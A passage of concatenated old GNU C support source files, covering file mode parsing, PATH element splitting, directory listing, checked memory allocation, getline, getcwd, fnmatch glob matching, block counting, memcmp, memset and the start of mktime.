  linkname = (char *) xmalloc (LINK_BUF + 1);
  linklen = readlink (relname, linkname, LINK_BUF);
  if (linklen < 0)
    {
      error (0, errno, "%s", name);
      free (linkname);
      return 0;
    }
  linkname[linklen] = '\0';
  return linkname;
}
#endif
/* modechange.c -- file mode manipulation
   Copyright (C) 1989, 1990 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

/* Written by David MacKenzie <djm@ai.mit.edu> */

/* The ASCII mode string is compiled into a linked list of `struct
   modechange', which can then be applied to each file to be changed.
   We do this instead of re-parsing the ASCII string for each file
   because the compiled form requires less computation to use; when
   changing the mode of many files, this probably results in a
   performance gain. */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <sys/types.h>
#include <sys/stat.h>
#include "modechange.h"

#ifdef STDC_HEADERS
#include <stdlib.h>
#else
char *malloc ();
#endif

#ifndef NULL
#define NULL 0
#endif

#ifdef STAT_MACROS_BROKEN
#undef S_ISDIR
#endif /* STAT_MACROS_BROKEN.  */

#if !defined(S_ISDIR) && defined(S_IFDIR)
#define S_ISDIR(m) (((m) & S_IFMT) == S_IFDIR)
#endif

/* Return newly allocated memory to hold one element of type TYPE. */
#define talloc(type) ((type *) malloc (sizeof (type)))

#define isodigit(c) ((c) >= '0' && (c) <= '7')

static int oatoi ();

/* Return a linked list of file mode change operations created from
   MODE_STRING, an ASCII string that contains either an octal number
   specifying an absolute mode, or symbolic mode change operations with
   the form:
   [ugoa...][[+-=][rwxXstugo...]...][,...]
   MASKED_OPS is a bitmask indicating which symbolic mode operators (=+-)
   should not affect bits set in the umask when no users are given.
   Operators not selected in MASKED_OPS ignore the umask.

   Return MODE_INVALID if `mode_string' does not contain a valid
   representation of file mode change operations;
   return MODE_MEMORY_EXHAUSTED if there is insufficient memory. */

struct mode_change *
mode_compile (mode_string, masked_ops)
     register char *mode_string;
     unsigned masked_ops;
{
  struct mode_change *head;	/* First element of the linked list. */
  struct mode_change *change;	/* An element of the linked list. */
  int i;			/* General purpose temporary. */
  unsigned short umask_value;	/* The umask value (surprise). */
  unsigned short affected_bits;	/* Which bits in the mode are operated on. */
  unsigned short affected_masked; /* `affected_bits' modified by umask. */
  unsigned ops_to_mask;		/* Operators to actually use umask on. */

  i = oatoi (mode_string);
  if (i >= 0)
    {
      if (i > 07777)
	return MODE_INVALID;
      head = talloc (struct mode_change);
      if (head == NULL)
	return MODE_MEMORY_EXHAUSTED;
      head->next = NULL;
      head->op = '=';
      head->flags = 0;
      head->value = i;
      head->affected = 07777;	/* Affect all permissions. */
      return head;
    }

  umask_value = umask (0);
  umask (umask_value);		/* Restore the old value. */

  head = NULL;
#ifdef lint
  change = NULL;
#endif
  --mode_string;

  /* One loop iteration for each "ugoa...=+-rwxXstugo...[=+-rwxXstugo...]". */
  do
    {
      affected_bits = 0;
      ops_to_mask = 0;
      /* Turn on all the bits in `affected_bits' for each group given. */
      for (++mode_string;; ++mode_string)
	switch (*mode_string)
	  {
	  case 'u':
	    affected_bits |= 04700;
	    break;
	  case 'g':
	    affected_bits |= 02070;
	    break;
	  case 'o':
	    affected_bits |= 01007;
	    break;
	  case 'a':
	    affected_bits |= 07777;
	    break;
	  default:
	    goto no_more_affected;
	  }

    no_more_affected:
      /* If none specified, affect all bits, except perhaps those
	 set in the umask. */
      if (affected_bits == 0)
	{
	  affected_bits = 07777;
	  ops_to_mask = masked_ops;
	}

      while (*mode_string == '=' || *mode_string == '+' || *mode_string == '-')
	{
	  /* Add the element to the tail of the list, so the operations
	     are performed in the correct order. */
	  if (head == NULL)
	    {
	      head = talloc (struct mode_change);
	      if (head == NULL)
		return MODE_MEMORY_EXHAUSTED;
	      change = head;
	    }
	  else
	    {
	      change->next = talloc (struct mode_change);
	      if (change->next == NULL)
		{
		  mode_free (change);
		  return MODE_MEMORY_EXHAUSTED;
		}
	      change = change->next;
	    }

	  change->next = NULL;
	  change->op = *mode_string;	/* One of "=+-". */
	  affected_masked = affected_bits;
	  if (ops_to_mask & (*mode_string == '=' ? MODE_MASK_EQUALS
			     : *mode_string == '+' ? MODE_MASK_PLUS
			     : MODE_MASK_MINUS))
	    affected_masked &= ~umask_value;
	  change->affected = affected_masked;
	  change->value = 0;
	  change->flags = 0;

	  /* Set `value' according to the bits set in `affected_masked'. */
	  for (++mode_string;; ++mode_string)
	    switch (*mode_string)
	      {
	      case 'r':
		change->value |= 00444 & affected_masked;
		break;
	      case 'w':
		change->value |= 00222 & affected_masked;
		break;
	      case 'X':
		change->flags |= MODE_X_IF_ANY_X;
		/* Fall through. */
	      case 'x':
		change->value |= 00111 & affected_masked;
		break;
	      case 's':
		/* Set the setuid/gid bits if `u' or `g' is selected. */
		change->value |= 06000 & affected_masked;
		break;
	      case 't':
		/* Set the "save text image" bit if `o' is selected. */
		change->value |= 01000 & affected_masked;
		break;
	      case 'u':
		/* Set the affected bits to the value of the `u' bits
		   on the same file.  */
		if (change->value)
		  goto invalid;
		change->value = 00700;
		change->flags |= MODE_COPY_EXISTING;
		break;
	      case 'g':
		/* Set the affected bits to the value of the `g' bits
		   on the same file.  */
		if (change->value)
		  goto invalid;
		change->value = 00070;
		change->flags |= MODE_COPY_EXISTING;
		break;
	      case 'o':
		/* Set the affected bits to the value of the `o' bits
		   on the same file.  */
		if (change->value)
		  goto invalid;
		change->value = 00007;
		change->flags |= MODE_COPY_EXISTING;
		break;
	      default:
		goto no_more_values;
	      }
	no_more_values:;
	}
  } while (*mode_string == ',');
  if (*mode_string == 0)
    return head;
invalid:
  mode_free (head);
  return MODE_INVALID;
}

/* Return file mode OLDMODE, adjusted as indicated by the list of change
   operations CHANGES.  If OLDMODE is a directory, the type `X'
   change affects it even if no execute bits were set in OLDMODE.
   The returned value has the S_IFMT bits cleared. */

unsigned short
mode_adjust (oldmode, changes)
     unsigned oldmode;
     register struct mode_change *changes;
{
  unsigned short newmode;	/* The adjusted mode and one operand. */
  unsigned short value;		/* The other operand. */

  newmode = oldmode & 07777;

  for (; changes; changes = changes->next)
    {
      if (changes->flags & MODE_COPY_EXISTING)
	{
	  /* Isolate in `value' the bits in `newmode' to copy, given in
	     the mask `changes->value'. */
	  value = newmode & changes->value;

	  if (changes->value & 00700)
	    /* Copy `u' permissions onto `g' and `o'. */
	    value |= (value >> 3) | (value >> 6);
	  else if (changes->value & 00070)
	    /* Copy `g' permissions onto `u' and `o'. */
	    value |= (value << 3) | (value >> 3);
	  else
	    /* Copy `o' permissions onto `u' and `g'. */
	    value |= (value << 3) | (value << 6);

	  /* In order to change only `u', `g', or `o' permissions,
	     or some combination thereof, clear unselected bits.
	     This can not be done in mode_compile because the value
	     to which the `changes->affected' mask is applied depends
	     on the old mode of each file. */
	  value &= changes->affected;
	}
      else
	{
	  value = changes->value;
	  /* If `X', do not affect the execute bits if the file is not a
	     directory and no execute bits are already set. */
	  if ((changes->flags & MODE_X_IF_ANY_X)
	      && !S_ISDIR (oldmode)
	      && (newmode & 00111) == 0)
	    value &= ~00111;	/* Clear the execute bits. */
	}

      switch (changes->op)
	{
	case '=':
	  /* Preserve the previous values in `newmode' of bits that are
	     not affected by this change operation. */
	  newmode = (newmode & ~changes->affected) | value;
	  break;
	case '+':
	  newmode |= value;
	  break;
	case '-':
	  newmode &= ~value;
	  break;
	}
    }
  return newmode;
}

/* Free the memory used by the list of file mode change operations
   CHANGES. */

void
mode_free (changes)
     register struct mode_change *changes;
{
  register struct mode_change *next;

  while (changes)
    {
      next = changes->next;
      free (changes);
      changes = next;
    }
}

/* Return a positive integer containing the value of the ASCII
   octal number S.  If S is not an octal number, return -1.  */

static int
oatoi (s)
     char *s;
{
  register int i;

  if (*s == 0)
    return -1;
  for (i = 0; isodigit (*s); ++s)
    i = i * 8 + *s - '0';
  if (*s)
    return -1;
  return i;
}
/* Return the next element of a path.
   Copyright (C) 1992 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

/* Written by David MacKenzie <djm@gnu.ai.mit.edu>,
   inspired by John P. Rouillard <rouilj@cs.umb.edu>.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <stdio.h>
#if defined(HAVE_STRING_H) || defined(STDC_HEADERS)
#include <string.h>
#else
#include <strings.h>
#ifndef strchr
#define strchr index
#endif
#endif

char *strdup ();
void free ();

/* Return the next element of a colon-separated path.
   A null entry in the path is equivalent to "." (the current directory).

   If NEW_PATH is non-NULL, set the path and return NULL.
   If NEW_PATH is NULL, return the next item in the string, or
   return NULL if there are no more elements.  */

char *
next_element (new_path)
     char *new_path;
{
  static char *path = NULL;	/* Freshly allocated copy of NEW_PATH.  */
  static char *end;		/* Start of next element to return.  */
  static int final_colon;	/* If zero, path didn't end with a colon.  */
  char *start;			/* Start of path element to return.  */

  if (new_path)
    {
      if (path)
	free (path);
      end = path = strdup (new_path);
      final_colon = 0;
      return NULL;
    }

  if (*end == '\0')
    {
      if (final_colon)
	{
	  final_colon = 0;
	  return ".";
	}
      return NULL;
    }

  start = end;
  final_colon = 1;		/* Maybe there will be one.  */

  end = strchr (start, ':');
  if (end == start)
    {
      /* An empty path element.  */
      *end++ = '\0';
      return ".";
    }
  else if (end == NULL)
    {
      /* The last path element.  */
      end = strchr (start, '\0');
      final_colon = 0;
    }
  else
    *end++ = '\0';

  return start;
}

#ifdef TEST
int
main ()
{
  char *p;

  next_element (getenv ("PATH"));
  while (p = next_element (NULL))
    puts (p);
  exit (0);
}
#endif /* TEST */
/* savedir.c -- save the list of files in a directory in a string
   Copyright (C) 1990 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

/* Written by David MacKenzie <djm@gnu.ai.mit.edu>. */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <sys/types.h>

#ifdef HAVE_UNISTD_H
#include <unistd.h>
#endif

#if HAVE_DIRENT_H
# include <dirent.h>
# define NAMLEN(dirent) strlen((dirent)->d_name)
#else
# define dirent direct
# define NAMLEN(dirent) (dirent)->d_namlen
# if HAVE_SYS_NDIR_H
#  include <sys/ndir.h>
# endif
# if HAVE_SYS_DIR_H
#  include <sys/dir.h>
# endif
# if HAVE_NDIR_H
#  include <ndir.h>
# endif
#endif

#ifdef CLOSEDIR_VOID
/* Fake a return value. */
#define CLOSEDIR(d) (closedir (d), 0)
#else
#define CLOSEDIR(d) closedir (d)
#endif

#ifdef STDC_HEADERS
#include <stdlib.h>
#include <string.h>
#else
char *malloc ();
char *realloc ();
#endif
#ifndef NULL
#define NULL 0
#endif

char *stpcpy ();

/* Return a freshly allocated string containing the filenames
   in directory DIR, separated by '\0' characters;
   the end is marked by two '\0' characters in a row.
   NAME_SIZE is the number of bytes to initially allocate
   for the string; it will be enlarged as needed.
   Return NULL if DIR cannot be opened or if out of memory. */

char *
savedir (dir, name_size)
     char *dir;
     unsigned name_size;
{
  DIR *dirp;
  struct dirent *dp;
  char *name_space;
  char *namep;

  dirp = opendir (dir);
  if (dirp == NULL)
    return NULL;

  name_space = (char *) malloc (name_size);
  if (name_space == NULL)
    {
      closedir (dirp);
      return NULL;
    }
  namep = name_space;

  while ((dp = readdir (dirp)) != NULL)
    {
      /* Skip "." and ".." (some NFS filesystems' directories lack them). */
      if (dp->d_name[0] != '.'
	  || (dp->d_name[1] != '\0'
	      && (dp->d_name[1] != '.' || dp->d_name[2] != '\0')))
	{
	  unsigned size_needed = (namep - name_space) + NAMLEN (dp) + 2;

	  if (size_needed > name_size)
	    {
	      char *new_name_space;

	      while (size_needed > name_size)
		name_size += 1024;

	      new_name_space = realloc (name_space, name_size);
	      if (new_name_space == NULL)
		{
		  closedir (dirp);
		  return NULL;
		}
	      namep += new_name_space - name_space;
	      name_space = new_name_space;
	    }
	  namep = stpcpy (namep, dp->d_name) + 1;
	}
    }
  *namep = '\0';
  if (CLOSEDIR (dirp))
    {
      free (name_space);
      return NULL;
    }
  return name_space;
}
/* xmalloc.c -- malloc with out of memory checking
   Copyright (C) 1990, 91, 92, 93, 94 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#if __STDC__
#define VOID void
#else
#define VOID char
#endif

#include <sys/types.h>

#if STDC_HEADERS
#include <stdlib.h>
#else
VOID *malloc ();
VOID *realloc ();
void free ();
#endif

#ifndef EXIT_FAILURE
#define EXIT_FAILURE 1
#endif

/* Exit value when the requested amount of memory is not available.
   The caller may set it to some other value.  */
int xmalloc_exit_failure = EXIT_FAILURE;

#if __STDC__ && (HAVE_VPRINTF || HAVE_DOPRNT)
void error (int, int, const char *, ...);
#else
void error ();
#endif

static VOID *
fixup_null_alloc (n)
     size_t n;
{
  VOID *p;

  p = 0;
  if (n == 0)
    p = malloc ((size_t) 1);
  if (p == 0)
    error (xmalloc_exit_failure, 0, "memory exhausted");
  return p;
}

/* Allocate N bytes of memory dynamically, with error checking.  */

VOID *
xmalloc (n)
     size_t n;
{
  VOID *p;

  p = malloc (n);
  if (p == 0)
    p = fixup_null_alloc (n);
  return p;
}

/* Change the size of an allocated block of memory P to N bytes,
   with error checking.
   If P is NULL, run xmalloc.  */

VOID *
xrealloc (p, n)
     VOID *p;
     size_t n;
{
  if (p == 0)
    return xmalloc (n);
  p = realloc (p, n);
  if (p == 0)
    p = fixup_null_alloc (n);
  return p;
}
/* getline.c -- Replacement for GNU C library function getline

Copyright (C) 1993 Free Software Foundation, Inc.

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License as
published by the Free Software Foundation; either version 2 of the
License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but
WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA. */

/* Written by Jan Brittenson, bson@gnu.ai.mit.edu.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <sys/types.h>
#include <stdio.h>
#define NDEBUG
#include <assert.h>

#if STDC_HEADERS
#include <stdlib.h>
#else
char *malloc (), *realloc ();
#endif

/* Always add at least this many bytes when extending the buffer.  */
#define MIN_CHUNK 64

/* Read up to (and including) a TERMINATOR from STREAM into *LINEPTR
   + OFFSET (and null-terminate it). *LINEPTR is a pointer returned from
   malloc (or NULL), pointing to *N characters of space.  It is realloc'd
   as necessary.  Return the number of characters read (not including the
   null terminator), or -1 on error or EOF.  */

int
getstr (lineptr, n, stream, terminator, offset)
     char **lineptr;
     size_t *n;
     FILE *stream;
     char terminator;
     int offset;
{
  int nchars_avail;		/* Allocated but unused chars in *LINEPTR.  */
  char *read_pos;		/* Where we're reading into *LINEPTR. */
  int ret;

  if (!lineptr || !n || !stream)
    return -1;

  if (!*lineptr)
    {
      *n = MIN_CHUNK;
      *lineptr = malloc (*n);
      if (!*lineptr)
	return -1;
    }

  nchars_avail = *n - offset;
  read_pos = *lineptr + offset;

  for (;;)
    {
      register int c = getc (stream);

      /* We always want at least one char left in the buffer, since we
	 always (unless we get an error while reading the first char)
	 NUL-terminate the line buffer.  */

      assert(*n - nchars_avail == read_pos - *lineptr);
      if (nchars_avail < 1)
	{
	  if (*n > MIN_CHUNK)
	    *n *= 2;
	  else
	    *n += MIN_CHUNK;

	  nchars_avail = *n + *lineptr - read_pos;
	  *lineptr = realloc (*lineptr, *n);
	  if (!*lineptr)
	    return -1;
	  read_pos = *n - nchars_avail + *lineptr;
	  assert(*n - nchars_avail == read_pos - *lineptr);
	}

      if (c == EOF || ferror (stream))
	{
	  /* Return partial line, if any.  */
	  if (read_pos == *lineptr)
	    return -1;
	  else
	    break;
	}

      *read_pos++ = c;
      nchars_avail--;

      if (c == terminator)
	/* Return the line.  */
	break;
    }

  /* Done - NUL terminate and return the number of chars read.  */
  *read_pos = '\0';

  ret = read_pos - (*lineptr + offset);
  return ret;
}

int
getline (lineptr, n, stream)
     char **lineptr;
     size_t *n;
     FILE *stream;
{
  return getstr (lineptr, n, stream, '\n', 0);
}
/* xstrdup.c -- copy a string with out of memory checking
   Copyright (C) 1990 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#if defined(STDC_HEADERS) || defined(HAVE_STRING_H)
#include <string.h>
#else
#include <strings.h>
#endif
char *xmalloc ();

/* Return a newly allocated copy of STRING.  */

char *
xstrdup (string)
     char *string;
{
  return strcpy (xmalloc (strlen (string) + 1), string);
}
/* xgetcwd.c -- return current directory with unlimited length
   Copyright (C) 1992 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

/* Written by David MacKenzie <djm@gnu.ai.mit.edu>.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <stdio.h>
#include <errno.h>
#ifndef errno
extern int errno;
#endif
#include <sys/types.h>
#include "pathmax.h"

#ifndef HAVE_GETCWD
char *getwd ();
#define getcwd(buf, max) getwd (buf)
#else
char *getcwd ();
#endif

/* Amount to increase buffer size by in each try. */
#define PATH_INCR 32

char *xmalloc ();
char *xrealloc ();
void free ();

/* Return the current directory, newly allocated, arbitrarily long.
   Return NULL and set errno on error. */

char *
xgetcwd ()
{
  char *cwd;
  char *ret;
  unsigned path_max;

  errno = 0;
  path_max = (unsigned) PATH_MAX;
  path_max += 2;		/* The getcwd docs say to do this. */

  cwd = xmalloc (path_max);

  errno = 0;
  while ((ret = getcwd (cwd, path_max)) == NULL && errno == ERANGE)
    {
      path_max += PATH_INCR;
      cwd = xrealloc (cwd, path_max);
      errno = 0;
    }

  if (ret == NULL)
    {
      int save_errno = errno;
      free (cwd);
      errno = save_errno;
      return NULL;
    }
  return cwd;
}
/* Copyright (C) 1991, 1992, 1993 Free Software Foundation, Inc.

This library is free software; you can redistribute it and/or
modify it under the terms of the GNU Library General Public License as
published by the Free Software Foundation; either version 2 of the
License, or (at your option) any later version.

This library is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
Library General Public License for more details.

You should have received a copy of the GNU Library General Public
License along with this library; see the file COPYING.LIB.  If
not, write to the Free Software Foundation, Inc., 675 Mass Ave,
Cambridge, MA 02139, USA.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <errno.h>
#include <fnmatch.h>
#include <ctype.h>


/* Comment out all this code if we are using the GNU C Library, and are not
   actually compiling the library itself.  This code is part of the GNU C
   Library, but also included in many other GNU distributions.  Compiling
   and linking in this code is a waste when using the GNU C library
   (especially if it is a shared library).  Rather than having every GNU
   program understand `configure --with-gnu-libc' and omit the object files,
   it is simpler to just do this in the source for each such file.  */

#if defined (_LIBC) || !defined (__GNU_LIBRARY__)


#if !defined(__GNU_LIBRARY__) && !defined(STDC_HEADERS)
extern int errno;
#endif

/* Match STRING against the filename pattern PATTERN, returning zero if
   it matches, nonzero if not.  */
int
fnmatch (pattern, string, flags)
     const char *pattern;
     const char *string;
     int flags;
{
  register const char *p = pattern, *n = string;
  register char c;

/* Note that this evalutes C many times.  */
#define FOLD(c)	((flags & FNM_CASEFOLD) && isupper (c) ? tolower (c) : (c))

  while ((c = *p++) != '\0')
    {
      c = FOLD (c);

      switch (c)
	{
	case '?':
	  if (*n == '\0')
	    return FNM_NOMATCH;
	  else if ((flags & FNM_FILE_NAME) && *n == '/')
	    return FNM_NOMATCH;
	  else if ((flags & FNM_PERIOD) && *n == '.' &&
		   (n == string || ((flags & FNM_FILE_NAME) && n[-1] == '/')))
	    return FNM_NOMATCH;
	  break;

	case '\\':
	  if (!(flags & FNM_NOESCAPE))
	    {
	      c = *p++;
	      c = FOLD (c);
	    }
	  if (FOLD (*n) != c)
	    return FNM_NOMATCH;
	  break;

	case '*':
	  if ((flags & FNM_PERIOD) && *n == '.' &&
	      (n == string || ((flags & FNM_FILE_NAME) && n[-1] == '/')))
	    return FNM_NOMATCH;

	  for (c = *p++; c == '?' || c == '*'; c = *p++, ++n)
	    if (((flags & FNM_FILE_NAME) && *n == '/') ||
		(c == '?' && *n == '\0'))
	      return FNM_NOMATCH;

	  if (c == '\0')
	    return 0;

	  {
	    char c1 = (!(flags & FNM_NOESCAPE) && c == '\\') ? *p : c;
	    c1 = FOLD (c1);
	    for (--p; *n != '\0'; ++n)
	      if ((c == '[' || FOLD (*n) == c1) &&
		  fnmatch (p, n, flags & ~FNM_PERIOD) == 0)
		return 0;
	    return FNM_NOMATCH;
	  }

	case '[':
	  {
	    /* Nonzero if the sense of the character class is inverted.  */
	    register int not;

	    if (*n == '\0')
	      return FNM_NOMATCH;

	    if ((flags & FNM_PERIOD) && *n == '.' &&
		(n == string || ((flags & FNM_FILE_NAME) && n[-1] == '/')))
	      return FNM_NOMATCH;

	    not = (*p == '!' || *p == '^');
	    if (not)
	      ++p;

	    c = *p++;
	    for (;;)
	      {
		register char cstart = c, cend = c;

		if (!(flags & FNM_NOESCAPE) && c == '\\')
		  cstart = cend = *p++;

		cstart = cend = FOLD (cstart);

		if (c == '\0')
		  /* [ (unterminated) loses.  */
		  return FNM_NOMATCH;

		c = *p++;
		c = FOLD (c);

		if ((flags & FNM_FILE_NAME) && c == '/')
		  /* [/] can never match.  */
		  return FNM_NOMATCH;

		if (c == '-' && *p != ']')
		  {
		    cend = *p++;
		    if (!(flags & FNM_NOESCAPE) && cend == '\\')
		      cend = *p++;
		    if (cend == '\0')
		      return FNM_NOMATCH;
		    cend = FOLD (cend);

		    c = *p++;
		  }

		if (FOLD (*n) >= cstart && FOLD (*n) <= cend)
		  goto matched;

		if (c == ']')
		  break;
	      }
	    if (!not)
	      return FNM_NOMATCH;
	    break;

	  matched:;
	    /* Skip the rest of the [...] that already matched.  */
	    while (c != ']')
	      {
		if (c == '\0')
		  /* [... (unterminated) loses.  */
		  return FNM_NOMATCH;

		c = *p++;
		if (!(flags & FNM_NOESCAPE) && c == '\\')
		  /* XXX 1003.2d11 is unclear if this is right.  */
		  ++p;
	      }
	    if (not)
	      return FNM_NOMATCH;
	  }
	  break;

	default:
	  if (c != FOLD (*n))
	    return FNM_NOMATCH;
	}

      ++n;
    }

  if (*n == '\0')
    return 0;

  if ((flags & FNM_LEADING_DIR) && *n == '/')
    /* The FNM_LEADING_DIR flag says that "foo*" matches "foobar/frobozz".  */
    return 0;

  return FNM_NOMATCH;
}

#endif	/* _LIBC or not __GNU_LIBRARY__.  */
/* Convert file size to number of blocks on System V-like machines.
   Copyright (C) 1990 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

/* Written by Brian L. Matthews, blm@6sceng.UUCP. */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#if !defined (HAVE_ST_BLOCKS) && !defined(_POSIX_SOURCE)
#include <sys/types.h>
#include <sys/param.h>

#ifndef NINDIR
/* Some SysV's, like Irix, seem to lack these.  Hope they're correct. */
/* Size of a indirect block, in bytes. */
#ifndef BSIZE
#define BSIZE 1024
#endif

/* Number of inode pointers per indirect block. */
#define NINDIR (BSIZE/sizeof(daddr_t))
#endif /* !NINDIR */

/* Number of direct block addresses in an inode. */
#define NDIR	10

/* Return the number of 512-byte blocks in a file of SIZE bytes. */

long
st_blocks (size)
     long size;
{
  long datablks = (size + 512 - 1) / 512;
  long indrblks = 0;

  if (datablks > NDIR)
    {
      indrblks = (datablks - NDIR - 1) / NINDIR + 1;

      if (datablks > NDIR + NINDIR)
	{
	  indrblks += (datablks - NDIR - NINDIR - 1) / (NINDIR * NINDIR) + 1;

	  if (datablks > NDIR + NINDIR + NINDIR * NINDIR)
	    indrblks++;
	}
    }

  return datablks + indrblks;
}
#endif
/* memcmp.c -- compare memory.
   Return:
   <0 if S1 < S2,
   0 if strings are identical,
   >0 if S1 > S2.
   Stops looking after N characters.  Doesn't stop at nulls.
   In the public domain.
   By David MacKenzie <djm@gnu.ai.mit.edu>. */

#include <sys/types.h>

int
#if __STDC__
memcmp (void const *v1, void const *v2, size_t n)
{
  register char *s1 = (char *) v1, *s2 = (char *) v2;
#else
memcmp (s1, s2, n)
     register char *s1, *s2;
     register unsigned n;
{
#endif
  register int diff;

  while (n--)
    {
      diff = *s1++ - *s2++;
      if (diff)
	return diff;
    }
  return 0;
}
/* memset.c -- set an area of memory to a given value
   Copyright (C) 1991 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

char *
memset (str, c, len)
     char *str;
     int c;
     unsigned len;
{
  register char *st = str;

  while (len-- > 0)
    *st++ = c;
  return str;
}
/* Copyright (C) 1993, 1994 Free Software Foundation, Inc.
   Contributed by Noel Cragg (noel@cs.oberlin.edu), with fixes by
   Michael E. Calwas (calwas@ttd.teradyne.com) and
   Wade Hampton (tasi029@tmn.com).

This file is part of the GNU C Library.

The GNU C Library is free software; you can redistribute it and/or
modify it under the terms of the GNU Library General Public License as
published by the Free Software Foundation; either version 2 of the
License, or (at your option) any later version.

The GNU C Library is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
Library General Public License for more details.

You should have received a copy of the GNU Library General Public
License along with the GNU C Library; see the file COPYING.LIB.  If
not, write to the Free Software Foundation, Inc., 675 Mass Ave,
Cambridge, MA 02139, USA.  */

/* Define this to have a standalone program to test this implementation of
   mktime.  */
/* #define DEBUG */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <sys/types.h>		/* Some systems define `time_t' here.  */
#include <time.h>


#ifndef __isleap
/* Nonzero if YEAR is a leap year (every 4 years,
   except every 100th isn't, and every 400th is).  */
#define	__isleap(year)	\
  ((year) % 4 == 0 && ((year) % 100 != 0 || (year) % 400 == 0))
#endif

#ifndef __P
#if defined (__GNUC__) || (defined (__STDC__) && __STDC__)
#define __P(args) args
#else
#define __P(args) ()
#endif  /* GCC.  */
#endif  /* Not __P.  */

/* How many days are in each month.  */
const unsigned short int __mon_lengths[2][12] =
  {
    /* Normal years.  */
    { 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31 },
    /* Leap years.  */
    { 31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31 }
  };


static int times_through_search; /* This library routine should never
				    hang -- make sure we always return
				    when we're searching for a value */


